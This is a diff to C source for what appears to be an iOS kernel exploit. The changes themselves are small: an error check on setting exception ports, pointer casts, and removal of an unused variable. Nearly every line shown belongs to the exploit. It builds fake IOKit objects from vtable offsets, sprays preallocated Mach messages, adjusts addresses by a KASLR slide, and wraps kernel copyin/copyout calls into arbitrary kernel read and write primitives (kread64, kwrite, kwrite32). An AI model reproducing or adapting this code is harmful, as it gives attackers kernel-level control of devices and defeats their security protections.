@@ -162,7 +162,9 @@ void* do_thread(void* arg) {
                                      args->exception_port,
                                      EXCEPTION_STATE, // we want to receive a catch_exception_raise_state message
                                      ARM_THREAD_STATE64);
-    
+    if(err == KERN_FAILURE) {
+        printf("Failed to set exception ports.\n");
+    }
     free(args);
     
     load_regs_and_crash(buf);
@@ -267,7 +269,7 @@ static void _kx_find()
     r_obj[8] = get_metaclass;           // vtable + 0x38 (::getMetaClass)
     
     r_obj[9] = kernel_base;
-    r_obj[10] = &feedfacf;
+    r_obj[10] = (uint64_t)&feedfacf;
     r_obj[11] = copyout;
     
     memmove((uint8_t *)r_obj + 0x10, r_obj, sizeof(r_obj) - 0x10);
@@ -281,7 +283,7 @@ static void _kx_find()
         io_service_t service;
         IOConnectGetService(_ucs[i], &service);
         if (feedfacf != 0) {
-            _uc = _ucs[i];
+            _uc = (io_connect_t)_ucs[i];
             break;
         }
     }
@@ -297,7 +299,7 @@ static void _kx_find()
         send_prealloc_msg(_lazy_ports[i], (uint64_t *)r_obj, 30);
     
         io_service_t service;
-        IOConnectGetService(_uc, &service);
+        IOConnectGetService((io_connect_t)_uc, &service);
         
         if (feedfacf != 0xfeedfacf) {
             _lazy_port = _lazy_ports[i];
@@ -329,7 +331,6 @@ void kx3(uint64_t fptr, uint64_t arg0, uint64_t arg1, uint64_t arg2) {
     uint64_t osserializer_serialize = offsets.osserializer_serialize + _kaslr_shift;
     uint64_t get_metaclass = offsets.metaclass + _kaslr_shift;
     uint64_t ret = get_metaclass + 8;
-    uint64_t copyout = offsets.copyout + _kaslr_shift;
     
     uint64_t r_obj[64];
     memset(r_obj, 0, sizeof(r_obj));
@@ -352,7 +353,7 @@ void kx3(uint64_t fptr, uint64_t arg0, uint64_t arg1, uint64_t arg2) {
     send_prealloc_msg(_lazy_port, (uint64_t *)r_obj, 30);
 
     io_service_t service;
-    IOConnectGetService(_uc, &service);
+    IOConnectGetService((io_connect_t)_uc, &service);
     
     receive_prealloc_msg(_lazy_port);
 }
@@ -376,7 +377,7 @@ uint64_t kread64(uint64_t addr)
 {
     uint64_t copyout = offsets.copyout + _kaslr_shift;
     uint64_t value = 0;
-    kx3(copyout, addr, &value, sizeof(value));
+    kx3(copyout, addr, (uint64_t)&value, sizeof(value));
     
     return value;
 }
@@ -384,13 +385,13 @@ uint64_t kread64(uint64_t addr)
 void kwrite(uint64_t addr, uint8_t *userspace, int n)
 {
     uint64_t copyin = offsets.copyin + _kaslr_shift;
-    kx3(copyin, userspace, addr, n);
+    kx3(copyin, (uint64_t)userspace, addr, n);
 }
 
 void kwrite32(uint64_t addr, uint32_t value)
 {
     uint64_t copyin = offsets.copyin + _kaslr_shift;
-    kx3(copyin, &value, addr, sizeof(value));
+    kx3(copyin, (uint64_t)&value, addr, sizeof(value));
 }
 
 void kwrite64(uint64_t addr, uint64_t value)
